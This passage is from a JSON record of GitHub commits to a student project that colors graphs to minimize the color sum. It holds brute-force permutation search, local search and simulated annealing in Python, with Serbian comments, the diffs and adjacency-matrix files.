calc_solution_value(new_solution,graph)\n+        new_value,_ = calc_solution_value(new_solution,graph)\n         if new_value < curr_value:\n             solution = deepcopy(new_solution)\n             curr_value = new_value\n","add":1,"remove":1,"filename":"\/simulated_annealing_msc.py","badparts":["        new_value = calc_solution_value(new_solution,graph)"],"goodparts":["        new_value,_ = calc_solution_value(new_solution,graph)"]},{"diff":"\n     g.load_graph_from_file(\"random_graph.txt\")\n     # print(g)\n \n-    solution, curr_value = simulated_annealing(g,10000)\n+    solution, curr_value = simulated_annealing(g, 10000)\n     print(solution)\n-    print(curr_value)\n\\ No newline at end of file\n+    print(curr_value)\n+    suma, _ = calc_solution_value(solution, g)\n+    print(suma)\n\\ No newline at en","add":4,"remove":2,"filename":"\/simulated_annealing_msc.py","badparts":["    solution, curr_value = simulated_annealing(g,10000)","    print(curr_value)"],"goodparts":["    solution, curr_value = simulated_annealing(g, 10000)","    print(curr_value)","    suma, _ = calc_solution_value(solution, g)","    print(suma)"]}],"source":"\n\nimport random import numpy as np from copy import deepcopy from matplotlib import pyplot as plt from graph import Graph def free_colors(zauzete, ind, n): slobodne=[] for i in range(1,n+1): if i not in zauzete[ind]: slobodne.append(i) return slobodne def calc_solution_value(solution, graph): n=graph.num_of_vertices x_boje=[0 for _ in range(n)] zauzete=[[] for _ in range(n)] for i in range(len(solution)): ind=solution.index(i) if i==0: x_boje[ind]=1 for j in range(n): if graph.get_edges(ind,j)==1: zauzete[j].append(1) else: slobodne=free_colors(zauzete,ind,n) x_boje[ind]=min(slobodne) for j in range(n): if graph.get_edges(ind,j)==1: zauzete[j].append(x_boje[ind]) return sum(x_boje) def initialize(num_resources): solution=list(np.random.permutation(num_resources)) return solution def make_small_change(solution): poz1=random.randrange(0, len(solution)) poz2=random.randrange(0, len(solution)) pom=solution[poz1] solution[poz1]=solution[poz2] solution[poz2]=pom return solution def draw_graph(xs, ys): plt.title('Solution value through the iterations: ') plt.xlabel('Iters') plt.ylabel('Target function') plt.plot(xs, ys, color='blue') plt.show() def simulated_annealing(graph, max_iters): solution=initialize(graph.num_of_vertices) curr_value=calc_solution_value(solution, graph) best_solution=deepcopy(solution) best_value=curr_value xs=[] ys=[] for i in range(1,max_iters+1): new_solution=make_small_change(solution) new_value=calc_solution_value(new_solution,graph) if new_value < curr_value: solution=deepcopy(new_solution) curr_value=new_value if new_value < best_value: best_value=new_value best_solution=deepcopy(new_solution) else: p=1.0 \/\/ i**0.5 q=random.uniform(0,1) if q < p: curr_value=new_value solution=deepcopy(new_solution) xs.append(i) ys.append(curr_value) draw_graph(xs,ys) return best_solution,best_value if __name__=='__main__': g=Graph(30) g.random_graph() g.load_graph_from_file(\"random_graph.txt\") solution, curr_value=simulated_annealing(g,10000) print(solution) print(curr_value) ","sourceWithComments":"#!\/usr\/bin\/python3\nimport random\nimport numpy as np\n\nfrom copy import deepcopy\nfrom matplotlib import pyplot as plt\nfrom graph import Graph\n\ndef free_colors(zauzete, ind, n):\n    slobodne = []\n    for i in range(1,n+1):\n        if i not in zauzete[ind]:\n            slobodne.append(i)\n    return slobodne\n\ndef calc_solution_value(solution, graph):\n    n = graph.num_of_vertices\n    x_boje = [0 for _ in range(n)]\n    zauzete = [[] for _ in range(n)]\n\n    for i in range(len(solution)):\n        ind = solution.index(i)\n        if i == 0:\n            x_boje[ind] = 1\n            for j in range(n):\n                if graph.get_edges(ind,j) == 1:\n                    zauzete[j].append(1)\n        else:\n            slobodne = free_colors(zauzete,ind,n)\n            x_boje[ind] = min(slobodne)\n            for j in range(n):\n                if graph.get_edges(ind,j) == 1:\n                    zauzete[j].append(x_boje[ind])\n\n    # print(x_boje)\n    # print(sum(x_boje))\n    return sum(x_boje)\n\ndef initialize(num_resources):\n    #generisemo permutacije\n    solution = list(np.random.permutation(num_resources))\n    return solution\n\ndef make_small_change(solution):\n    poz1 = random.randrange(0, len(solution))\n    poz2 = random.randrange(0, len(solution))\n    pom = solution[poz1]\n    solution[poz1] = solution[poz2]\n    solution[poz2] = pom\n\n    return solution\ndef draw_graph(xs, ys):\n    # iscrtavnanje grafika\n    plt.title('Solution value through the iterations: ')\n    plt.xlabel('Iters')\n    plt.ylabel('Target function')\n    plt.plot(xs, ys, color='blue')\n    plt.show()\n\ndef simulated_annealing(graph, max_iters):\n    #initialize solution\n    solution = initialize(graph.num_of_vertices)\n    curr_value = calc_solution_value(solution, graph)\n\n    best_solution = deepcopy(solution)\n    best_value = curr_value\n\n    # za iscrtavanje grafika\n    xs = []\n    ys = []\n\n    for i in range(1,max_iters+1):\n        #malo promenimo resenje\n        new_solution = make_small_change(solution)\n        new_value = calc_solution_value(new_solution,graph)\n        if new_value < curr_value:\n            solution = deepcopy(new_solution)\n            curr_value = new_value\n            if new_value < best_value:\n                best_value = new_value\n                best_solution = deepcopy(new_solution)\n        else:\n            #ponekad prihvati i to losije resenje\n            p = 1.0 \/\/ i**0.5\n            q = random.uniform(0,1)\n            if q < p:\n                curr_value = new_value\n                solution = deepcopy(new_solution)\n\n        xs.append(i)\n        ys.append(curr_value)\n\n    draw_graph(xs,ys)\n\n    return best_solution,best_value\n\nif __name__=='__main__':\n\n    g = Graph(30)\n    g.random_graph()\n    # g.save_graph_to_file(\"random_graph.txt\")\n    g.load_graph_from_file(\"random_graph.txt\")\n    # print(g)\n\n    solution, curr_value = simulated_annealing(g,10000)\n    print(solution)\n    print(curr_value)"}},"msg":"Change file brute_force_msc.py and add small_random_graph example"},"4f6bfa01a53530cd265800e7a0efd52dfbddd060":{"url":"https:\/\/api.github.com\/repos\/Marija63\/Racunarska-Inteligencija\/commits\/4f6bfa01a53530cd265800e7a0efd52dfbddd060","html_url":"https:\/\/github.com\/Marija63\/Racunarska-Inteligencija\/commit\/4f6bfa01a53530cd265800e7a0efd52dfbddd060","sha":"4f6bfa01a53530cd265800e7a0efd52dfbddd060","keyword":"brute force change","diff":"diff --git a\/__pycache__\/brute_force_msc.cpython-310.pyc b\/__pycache__\/brute_force_msc.cpython-310.pyc\nindex 6dcea1d..c9474a8 100644\nBinary files a\/__pycache__\/brute_force_msc.cpython-310.pyc and b\/__pycache__\/brute_force_msc.cpython-310.pyc differ\ndiff --git a\/brute_force_msc.py b\/brute_force_msc.py\nindex e590c21..279d629 100644\n--- a\/brute_force_msc.py\n+++ b\/brute_force_msc.py\n@@ -1,121 +1,65 @@\n from graph import Graph\n-from collections import Counter\n-\n-# proveravamo da li mozemo na taj nacin da obojimo graf\n-def isSafe(graph, v, colors_vector, c):\n-    for i in range(graph.num_of_vertices):\n-        if graph.adjacency_matrix[v][i] == 1 and colors_vector[i] == c:\n-            return False\n-    return True\n-\n-# proveravamo da li mozemo sa m boja da obojimo graf\n-def graph_coloring_util(graph, m, colors_vector, v):\n-    if v == graph.num_of_vertices:\n-        return True\n-    # krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n-    for c in range(1, m + 1):\n-        if isSafe(graph, v, colors_vector, c) == True:\n-            colors_vector[v] = c\n-            # kada obojimo taj cvor pozivamo rekurzivno za naredni\n-            if graph_coloring_util(graph, m, colors_vector, v + 1) == True:\n-                return True\n-            colors_vector[v] = 0\n-\n-# pokusavamo da obojimo graf sa m boja\n-def graph_coloring(graph,m):\n-    colors_vector = [0 for _ in range(graph.num_of_vertices)]\n-    if graph_coloring_util(graph, m, colors_vector, 0) == None:\n-        return False, 0, colors_vector\n-    return True, max(colors_vector), colors_vector\n-\n-#stari calc_solution trebace\n-def minimum_color_sum(colors_vector):\n-\n-    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n-    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n-    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n-    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n-\n-    tmp = list(map(lambda el: (el,1),colors_vector))\n-    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n-    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n-\n-    total_sum = 0\n-    for index,tupp in enumerate(tmp):\n-        total_sum += (index+1)*tupp[1]\n-\n-    return total_sum\n-\n \n+#ovde cuvam permutaciju koja ima najbolji color_sum\n+best_permutation = []\n+best_coloring_sum = float('inf')\n+def free_colors(zauzete, ind, n):\n+    slobodne = []\n+    for i in range(1,n+1):\n+        if i not in zauzete[ind]:\n+            slobodne.append(i)\n+    return slobodne\n+def calc_sum_of_coloring(permutation, graph):\n+    n = graph.num_of_vertices\n+    x_boje = [0 for _ in range(n)]\n+    zauzete = [[] for _ in range(n)]\n+\n+    for i in range(len(permutation)):\n+        ind = permutation.index(i)\n+        if i == 0:\n+            x_boje[ind] = 1\n+            for j in range(n):\n+                if graph.get_edges(ind, j) == 1:\n+                    zauzete[j].append(1)\n+        else:\n+            slobodne = free_colors(zauzete, ind, n)\n+            x_boje[ind] = min(slobodne)\n+            for j in range(n):\n+                if graph.get_edges(ind, j) == 1:\n+                    zauzete[j].append(x_boje[ind])\n+\n+    return sum(x_boje)\n+def next_permutation(permutation, i, used, graph):\n+# ako smo stigli do kraja generisali smo jednu permutaciju\n+    if i == len(permutation):\n+        coloring_sum = calc_sum_of_coloring(permutation, graph)\n+        global best_coloring_sum\n+        global best_permutation\n+        if coloring_sum < best_coloring_sum:\n+            best_coloring_sum = coloring_sum\n+            best_permutation = permutation\n+    else:\n+        for j in range(0, len(permutation)):\n+            if used[j] == False:\n+                permutation[i] = j\n+                used[j] = True\n+                next_permutation(permutation, i+1,used, graph)\n+                used[j] = 0\n def brute_force(graph):\n-    num_of_color = 0\n-    #pokusavamo da obojimo graf sa minimalnim brojem boja\n-    for i in range(2,graph.num_of_vertices + 1):\n-        success, num_of_color, colors_vector = graph_coloring(graph,i)\n-        # ako je graf uspesno obojen\n-        if success == True:\n-            print(\"Graf je obojen sa minimalno \" + str(num_of_color) + \" boja\")\n-            print(colors_vector)\n-            sum = minimum_color_sum(colors_vector)\n-            print(\"Minimalna suma: \", sum)\n-            break\n+\n+    permutation = [0 for _ in range(graph.num_of_vertices)]\n+    used = [False for _ in range(graph.num_of_vertices)]\n+    next_permutation(permutation, 0, used, graph)\n+    global best_coloring_sum\n+    global best_permutation\n+    best_coloring_sum = best_coloring_sum\n+    best_permutation = best_permutation\n+    return best_permutation, best_coloring_sum\n \n if __name__ == '__main__':\n-    g = Graph(16)\n+    g = Graph(12)\n     g.random_graph()\n     g.save_graph_to_file(\"small_random_graph.txt\")\n-    # g.load_graph_from_file(\"small_random_graph.txt\")\n+    g.load_graph_from_file(\"small_random_graph.txt\")\n     print(g)\n-\n-    # brute_force(g)\n-\n-\n-\n-    # staro --vrtno nece TREBATI\n-    # numvertices= random.randrange(3,15)\n-    # g = Graph(numvertices)\n-    # #g= Graph(5)\n-    # minsuma = 9999999999999\n-    #\n-    # suma =0\n-    # print(\"number of enges\")\n-    # print(numvertices)\n-    # g.graph = g.randomGraph(numvertices)\n-    # true, num, colors_vector =g.graphcolors_vectoring(numvertices)\n-    # for c in colors_vector:\n-    #     suma= suma +c\n-    #\n-    # if suma <minsuma:\n-    #     minsuma = suma\n-    #\n-    #\n-    # print('prva suma koju nadje  je: ',minsuma)\n-    # if true == False:\n-    #     print(\"solution not exist\")\n-    #\n-    # elif true == True:\n-    #     for i in range(num-1):\n-    #         suma =0\n-    #         stop, newnum, colors_vector1 =g.graphcolors_vectoring(num-i-1)\n-    #\n-    #         if stop == True:\n-    #             for c in colors_vector1:\n-    #                 suma= suma +c\n-    #\n-    #             if suma <minsuma:\n-    #                 minsuma = suma\n-    #             colors_vector=colors_vector1\n-    #             continue\n-    #         elif stop == False:\n-    #             print(\"Solution exist and Following are the assigned colors_vectors:\")\n-    #             for c in colors_vector:\n-    #                 print(c,end=' ')\n-    #             print()\n-    #             print('minimumna suma je: ' , minsuma)\n-    #             print('min num of colors_vector are ',max(colors_vector))\n-    #             break\n-   \n-\n-\n-\n-\n+    # print(brute_force(g))\n\\ No newline at end of file\ndiff --git a\/main.py b\/main.py\nindex 9f5d5f3..27001e5 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -11,8 +11,11 @@\n     max_iters = 10000\n \n     #Brute force algorithm\n-    print(\"Brute force results: \")\n-    brute_force(g)\n+    # solution, curr_value = brute_force(g)\n+    # print(\"Brute force results: \")\n+    # _,colors_vector = calc_solution_value(solution,g)\n+    # print(colors_vector)\n+    # print(curr_value)\n \n     #Local search algorithm\n     solution, curr_value = local_search(g, max_iters)\ndiff --git a\/small_random_graph.txt b\/small_random_graph.txt\nindex 9d72329..541312a 100644\n--- a\/small_random_graph.txt\n+++ b\/small_random_graph.txt\n@@ -1,17 +1,12 @@\n-16\n-0 0 1 1 1 1 0 0 1 1 1 1 0 1 1 1\n-0 0 1 0 1 1 1 1 1 0 0 1 0 1 1 0\n-1 1 0 0 1 1 1 1 1 0 1 1 1 0 1 0\n-1 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1\n-1 1 1 0 0 1 1 1 1 1 1 1 1 0 1 1\n-1 1 1 1 1 0 1 1 0 1 1 0 1 1 1 0\n-0 1 1 1 1 1 0 1 1 1 1 1 1 1 1 1\n-0 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1\n-1 1 1 1 1 0 1 1 0 1 1 1 1 1 1 0\n-1 0 0 1 1 1 1 1 1 0 1 1 1 1 0 1\n-1 0 1 1 1 1 1 1 1 1 0 1 0 0 0 1\n-1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 0\n-0 0 1 1 1 1 1 1 1 1 0 1 0 0 1 0\n-1 1 0 1 0 1 1 1 1 1 0 1 0 0 1 0\n-1 1 1 1 1 1 1 1 1 0 0 1 1 1 0 0\n-1 0 0 1 1 0 1 1 0 1 1 0 0 0 0 0\n+11\n+0 0 1 1 1 0 1 1 1 1 0\n+0 0 0 1 1 1 1 1 1 0 0\n+1 0 0 1 1 1 1 1 1 1 1\n+1 1 1 0 1 1 1 0 1 0 1\n+1 1 1 1 0 0 1 1 1 1 1\n+0 1 1 1 0 0 0 1 0 1 0\n+1 1 1 1 1 0 0 0 1 0 0\n+1 1 1 0 1 1 0 0 1 0 0\n+1 1 1 1 1 0 1 1 0 1 1\n+1 0 1 0 1 1 0 0 1 0 0\n+0 0 1 1 1 0 0 0 1 0 0\n","message":"","files":{"\/brute_force_msc.py":{"changes":[{"diff":"\n from graph import Graph\n-from collections import Counter\n-\n-# proveravamo da li mozemo na taj nacin da obojimo graf\n-def isSafe(graph, v, colors_vector, c):\n-    for i in range(graph.num_of_vertices):\n-        if graph.adjacency_matrix[v][i] == 1 and colors_vector[i] == c:\n-            return False\n-    return True\n-\n-# proveravamo da li mozemo sa m boja da obojimo graf\n-def graph_coloring_util(graph, m, colors_vector, v):\n-    if v == graph.num_of_vertices:\n-        return True\n-    # krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n-    for c in range(1, m + 1):\n-        if isSafe(graph, v, colors_vector, c) == True:\n-            colors_vector[v] = c\n-            # kada obojimo taj cvor pozivamo rekurzivno za naredni\n-            if graph_coloring_util(graph, m, colors_vector, v + 1) == True:\n-                return True\n-            colors_vector[v] = 0\n-\n-# pokusavamo da obojimo graf sa m boja\n-def graph_coloring(graph,m):\n-    colors_vector = [0 for _ in range(graph.num_of_vertices)]\n-    if graph_coloring_util(graph, m, colors_vector, 0) == None:\n-        return False, 0, colors_vector\n-    return True, max(colors_vector), colors_vector\n-\n-#stari calc_solution trebace\n-def minimum_color_sum(colors_vector):\n-\n-    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n-    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n-    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n-    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n-\n-    tmp = list(map(lambda el: (el,1),colors_vector))\n-    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n-    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n-\n-    total_sum = 0\n-    for index,tupp in enumerate(tmp):\n-        total_sum += (index+1)*tupp[1]\n-\n-    return total_sum\n-\n \n+#ovde cuvam permutaciju koja ima najbolji color_sum\n+best_permutation = []\n+best_coloring_sum = float('inf')\n+def free_colors(zauzete, ind, n):\n+    slobodne = []\n+    for i in range(1,n+1):\n+        if i not in zauzete[ind]:\n+            slobodne.append(i)\n+    return slobodne\n+def calc_sum_of_coloring(permutation, graph):\n+    n = graph.num_of_vertices\n+    x_boje = [0 for _ in range(n)]\n+    zauzete = [[] for _ in range(n)]\n+\n+    for i in range(len(permutation)):\n+        ind = permutation.index(i)\n+        if i == 0:\n+            x_boje[ind] = 1\n+            for j in range(n):\n+                if graph.get_edges(ind, j) == 1:\n+                    zauzete[j].append(1)\n+        else:\n+            slobodne = free_colors(zauzete, ind, n)\n+            x_boje[ind] = min(slobodne)\n+            for j in range(n):\n+                if graph.get_edges(ind, j) == 1:\n+                    zauzete[j].append(x_boje[ind])\n+\n+    return sum(x_boje)\n+def next_permutation(permutation, i, used, graph):\n+# ako smo stigli do kraja generisali smo jednu permutaciju\n+    if i == len(permutation):\n+        coloring_sum = calc_sum_of_coloring(permutation, graph)\n+        global best_coloring_sum\n+        global best_permutation\n+        if coloring_sum < best_coloring_sum:\n+            best_coloring_sum = coloring_sum\n+            best_permutation = permutation\n+    else:\n+        for j in range(0, len(permutation)):\n+            if used[j] == False:\n+                permutation[i] = j\n+                used[j] = True\n+                next_permutation(permutation, i+1,used, graph)\n+                used[j] = 0\n def brute_force(graph):\n-    num_of_color = 0\n-    #pokusavamo da obojimo graf sa minimalnim brojem boja\n-    for i in range(2,graph.num_of_vertices + 1):\n-        success, num_of_color, colors_vector = graph_coloring(graph,i)\n-        # ako je graf uspesno obojen\n-        if success == True:\n-            print(\"Graf je obojen sa minimalno \" + str(num_of_color) + \" boja\")\n-            print(colors_vector)\n-            sum = minimum_color_sum(colors_vector)\n-            print(\"Minimalna suma: \", sum)\n-            break\n+\n+    permutation = [0 for _ in range(graph.num_of_vertices)]\n+    used = [False for _ in range(graph.num_of_vertices)]\n+    next_permutation(permutation, 0, used, graph)\n+    global best_coloring_sum\n+    global best_permutation\n+    best_coloring_sum = best_coloring_sum\n+    best_permutation = best_permutation\n+    return best_permutation, best_coloring_sum\n \n if __name__ == '__main__':\n-    g = Graph(16)\n+    g = Graph(12)\n     g.random_graph()\n     g.save_graph_to_file(\"small_random_graph.txt\")\n-    # g.load_graph_from_file(\"small_random_graph.txt\")\n+    g.load_graph_from_file(\"small_random_graph.txt\")\n     print(g)\n-\n-    # brute_force(g)\n-\n-\n-\n-    # staro --vrtno nece TREBATI\n-    # numvertices= random.randrange(3,15)\n-    # g = Graph(numvertices)\n-    # #g= Graph(5)\n-    # minsuma = 9999999999999\n-    #\n-    # suma =0\n-    # print(\"number of enges\")\n-    # print(numvertices)\n-    # g.graph = g.randomGraph(numvertices)\n-    # true, num, colors_vector =g.graphcolors_vectoring(numvertices)\n-    # for c in colors_vector:\n-    #     suma= suma +c\n-    #\n-    # if suma <minsuma:\n-    #     minsuma = suma\n-    #\n-    #\n-    # print('prva suma koju nadje  je: ',minsuma)\n-    # if true == False:\n-    #     print(\"solution not exist\")\n-    #\n-    # elif true == True:\n-    #     for i in range(num-1):\n-    #         suma =0\n-    #         stop, newnum, colors_vector1 =g.graphcolors_vectoring(num-i-1)\n-    #\n-    #         if stop == True:\n-    #             for c in colors_vector1:\n-    #                 suma= suma +c\n-    #\n-    #             if suma <minsuma:\n-    #                 minsuma = suma\n-    #             colors_vector=colors_vector1\n-    #             continue\n-    #         elif stop == False:\n-    #             print(\"Solution exist and Following are the assigned colors_vectors:\")\n-    #             for c in colors_vector:\n-    #                 print(c,end=' ')\n-    #             print()\n-    #             print('minimumna suma je: ' , minsuma)\n-    #             print('min num of colors_vector are ',max(colors_vector))\n-    #             break\n-   \n-\n-\n-\n-\n+    # print(brute_force(g))\n\\ No newline at end of fil","add":57,"remove":113,"filename":"\/brute_force_msc.py","badparts":["from collections import Counter","def isSafe(graph, v, colors_vector, c):","    for i in range(graph.num_of_vertices):","        if graph.adjacency_matrix[v][i] == 1 and colors_vector[i] == c:","            return False","    return True","def graph_coloring_util(graph, m, colors_vector, v):","    if v == graph.num_of_vertices:","        return True","    for c in range(1, m + 1):","        if isSafe(graph, v, colors_vector, c) == True:","            colors_vector[v] = c","            if graph_coloring_util(graph, m, colors_vector, v + 1) == True:","                return True","            colors_vector[v] = 0","def graph_coloring(graph,m):","    colors_vector = [0 for _ in range(graph.num_of_vertices)]","    if graph_coloring_util(graph, m, colors_vector, 0) == None:","        return False, 0, colors_vector","    return True, max(colors_vector), colors_vector","def minimum_color_sum(colors_vector):","    tmp = list(map(lambda el: (el,1),colors_vector))","    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))","    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)","    total_sum = 0","    for index,tupp in enumerate(tmp):","        total_sum += (index+1)*tupp[1]","    return total_sum","    num_of_color = 0","    for i in range(2,graph.num_of_vertices + 1):","        success, num_of_color, colors_vector = graph_coloring(graph,i)","        if success == True:","            print(\"Graf je obojen sa minimalno \" + str(num_of_color) + \" boja\")","            print(colors_vector)","            sum = minimum_color_sum(colors_vector)","            print(\"Minimalna suma: \", sum)","            break","    g = Graph(16)"],"goodparts":["best_permutation = []","best_coloring_sum = float('inf')","def free_colors(zauzete, ind, n):","    slobodne = []","    for i in range(1,n+1):","        if i not in zauzete[ind]:","            slobodne.append(i)","    return slobodne","def calc_sum_of_coloring(permutation, graph):","    n = graph.num_of_vertices","    x_boje = [0 for _ in range(n)]","    zauzete = [[] for _ in range(n)]","    for i in range(len(permutation)):","        ind = permutation.index(i)","        if i == 0:","            x_boje[ind] = 1","            for j in range(n):","                if graph.get_edges(ind, j) == 1:","                    zauzete[j].append(1)","        else:","            slobodne = free_colors(zauzete, ind, n)","            x_boje[ind] = min(slobodne)","            for j in range(n):","                if graph.get_edges(ind, j) == 1:","                    zauzete[j].append(x_boje[ind])","    return sum(x_boje)","def next_permutation(permutation, i, used, graph):","    if i == len(permutation):","        coloring_sum = calc_sum_of_coloring(permutation, graph)","        global best_coloring_sum","        global best_permutation","        if coloring_sum < best_coloring_sum:","            best_coloring_sum = coloring_sum","            best_permutation = permutation","    else:","        for j in range(0, len(permutation)):","            if used[j] == False:","                permutation[i] = j","                used[j] = True","                next_permutation(permutation, i+1,used, graph)","                used[j] = 0","    permutation = [0 for _ in range(graph.num_of_vertices)]","    used = [False for _ in range(graph.num_of_vertices)]","    next_permutation(permutation, 0, used, graph)","    global best_coloring_sum","    global best_permutation","    best_coloring_sum = best_coloring_sum","    best_permutation = best_permutation","    return best_permutation, best_coloring_sum","    g = Graph(12)","    g.load_graph_from_file(\"small_random_graph.txt\")"]}],"source":"\nfrom graph import Graph from collections import Counter def isSafe(graph, v, colors_vector, c): for i in range(graph.num_of_vertices): if graph.adjacency_matrix[v][i]==1 and colors_vector[i]==c: return False return True def graph_coloring_util(graph, m, colors_vector, v): if v==graph.num_of_vertices: return True for c in range(1, m +1): if isSafe(graph, v, colors_vector, c)==True: colors_vector[v]=c if graph_coloring_util(graph, m, colors_vector, v +1)==True: return True colors_vector[v]=0 def graph_coloring(graph,m): colors_vector=[0 for _ in range(graph.num_of_vertices)] if graph_coloring_util(graph, m, colors_vector, 0)==None: return False, 0, colors_vector return True, max(colors_vector), colors_vector def minimum_color_sum(colors_vector): tmp=list(map(lambda el:(el,1),colors_vector)) tmp=list(set([(el[0], Counter(tmp)[el]) for el in tmp])) tmp=sorted(tmp, key=lambda el: el[1],reverse=True) total_sum=0 for index,tupp in enumerate(tmp): total_sum +=(index+1)*tupp[1] return total_sum def brute_force(graph): num_of_color=0 for i in range(2,graph.num_of_vertices +1): success, num_of_color, colors_vector=graph_coloring(graph,i) if success==True: print(\"Graf je obojen sa minimalno \" +str(num_of_color) +\" boja\") print(colors_vector) sum=minimum_color_sum(colors_vector) print(\"Minimalna suma: \", sum) break if __name__=='__main__': g=Graph(16) g.random_graph() g.save_graph_to_file(\"small_random_graph.txt\") print(g) ","sourceWithComments":"from graph import Graph\nfrom collections import Counter\n\n# proveravamo da li mozemo na taj nacin da obojimo graf\ndef isSafe(graph, v, colors_vector, c):\n    for i in range(graph.num_of_vertices):\n        if graph.adjacency_matrix[v][i] == 1 and colors_vector[i] == c:\n            return False\n    return True\n\n# proveravamo da li mozemo sa m boja da obojimo graf\ndef graph_coloring_util(graph, m, colors_vector, v):\n    if v == graph.num_of_vertices:\n        return True\n    # krecemo od broja 1 i nastavljamo sa prvom slobodnom bojom sa kojom moze da se oboji\n    for c in range(1, m + 1):\n        if isSafe(graph, v, colors_vector, c) == True:\n            colors_vector[v] = c\n            # kada obojimo taj cvor pozivamo rekurzivno za naredni\n            if graph_coloring_util(graph, m, colors_vector, v + 1) == True:\n                return True\n            colors_vector[v] = 0\n\n# pokusavamo da obojimo graf sa m boja\ndef graph_coloring(graph,m):\n    colors_vector = [0 for _ in range(graph.num_of_vertices)]\n    if graph_coloring_util(graph, m, colors_vector, 0) == None:\n        return False, 0, colors_vector\n    return True, max(colors_vector), colors_vector\n\n#stari calc_solution trebace\ndef minimum_color_sum(colors_vector):\n\n    #[1,2,4,7,1,3,6,7,7,2,4] boje svakog cvora\n    #[(1,2),(2,2),(3,1),(4,2),(6,1),(7,3)] broj pojavljivanja svake boje\n    #[(7,3),(4,2),(2,2),(1,2),(6,1),(3,1)] sortiramo po boju pojavljivanja tj.drugom parametru\n    # 3*1 + 2*2 + 2*3 + 2*4 + 1*5 + 1*6  funkcija cilja=suma(broj_pojavljuvanja*indeks_unizu)\n\n    tmp = list(map(lambda el: (el,1),colors_vector))\n    tmp = list(set([(el[0], Counter(tmp)[el]) for el in tmp]))\n    tmp = sorted(tmp, key = lambda el: el[1],reverse=True)\n\n    total_sum = 0\n    for index,tupp in enumerate(tmp):\n        total_sum += (index+1)*tupp[1]\n\n    return total_sum\n\n\ndef brute_force(graph):\n    num_of_color = 0\n    #pokusavamo da obojimo graf sa minimalnim brojem boja\n    for i in range(2,graph.num_of_vertices + 1):\n        success, num_of_color, colors_vector = graph_coloring(graph,i)\n        # ako je graf uspesno obojen\n        if success == True:\n            print(\"Graf je obojen sa minimalno \" + str(num_of_color) + \" boja\")\n            print(colors_vector)\n            sum = minimum_color_sum(colors_vector)\n            print(\"Minimalna suma: \", sum)\n            break\n\nif __name__ == '__main__':\n    g = Graph(16)\n    g.random_graph()\n    g.save_graph_to_file(\"small_random_graph.txt\")\n    # g.load_graph_from_file(\"small_random_graph.txt\")\n    print(g)\n\n    # brute_force(g)\n\n\n\n    # staro --vrtno nece TREBATI\n    # numvertices= random.randrange(3,15)\n    # g = Graph(numvertices)\n    # #g= Graph(5)\n    # minsuma = 9999999999999\n    #\n    # suma =0\n    # print(\"number of enges\")\n    # print(numvertices)\n    # g.graph = g.randomGraph(numvertices)\n    # true, num, colors_vector =g.graphcolors_vectoring(numvertices)\n    # for c in colors_vector:\n    #     suma= suma +c\n    #\n    # if suma <minsuma:\n    #     minsuma = suma\n    #\n    #\n    # print('prva suma koju nadje  je: ',minsuma)\n    # if true == False:\n    #     print(\"solution not exist\")\n    #\n    # elif true == True:\n    #     for i in range(num-1):\n    #         suma =0\n    #         stop, newnum, colors_vector1 =g.graphcolors_vectoring(num-i-1)\n    #\n    #         if stop == True:\n    #             for c in colors_vector1:\n    #                 suma= suma +c\n    #\n    #             if suma <minsuma:\n    #                 minsuma = suma\n    #             colors_vector=colors_vector1\n    #             continue\n    #         elif stop == False:\n    #             print(\"Solution exist and Following are the assigned colors_vectors:\")\n    #             for c in colors_vector:\n    #                 print(c,end=' ')\n    #             print()\n    #             print('minimumna suma je: ' , minsuma)\n    #             print('min num of colors_vector are ',max(colors_vector))\n    #             break\n   \n\n\n\n\n"},"\/main.py":{"changes":[{"diff":"\n     max_iters = 10000\n \n     #Brute force algorithm\n-    print(\"Brute force results: \")\n-    brute_force(g)\n+    # solution, curr_value = brute_force(g)\n+    # print(\"Brute force results: \")\n+    # _,colors_vector = calc_solution_value(solution,g)\n+    # print(colors_vector)\n+    # print(curr_value)\n \n     #Local search algorithm\n     solution, curr_value = local_search(g, max_iter","add":5,"remove":2,"filename":"\/main.py","badparts":["    print(\"Brute force results: \")","    brute_force(g)"],"goodparts":[]}],"source":"\nfrom simulated_annealing_msc import simulated_annealing from local_search_mcs import local_search from brute_force_msc import brute_force from local_search_mcs import calc_solution_value from graph import Graph if __name__=='__main__': g=Graph() g.load_graph_from_file(\"small_random_graph.txt\") max_iters=10000 print(\"Brute force results: \") brute_force(g) solution, curr_value=local_search(g, max_iters) print(\"Local search results: \") _,colors_vector=calc_solution_value(solution,g) print(colors_vector) print(curr_value) solution, curr_value=simulated_annealing(g, max_iters) print(\"Simulated_annealing results: \") _, colors_vector=calc_solution_value(solution, g) print(colors_vector) print(curr_value) ","sourceWithComments":"from simulated_annealing_msc import simulated_annealing\nfrom local_search_mcs import local_search\nfrom brute_force_msc import brute_force\nfrom local_search_mcs import calc_solution_value\nfrom graph import Graph\n\nif __name__ == '__main__':\n    g = Graph()\n    g.load_graph_from_file(\"small_random_graph.txt\")\n    # print(g)\n    max_iters = 10000\n\n    #Brute force algorithm\n    print(\"Brute force results: \")\n    brute_force(g)\n\n    #Local search algorithm\n    solution, curr_value = 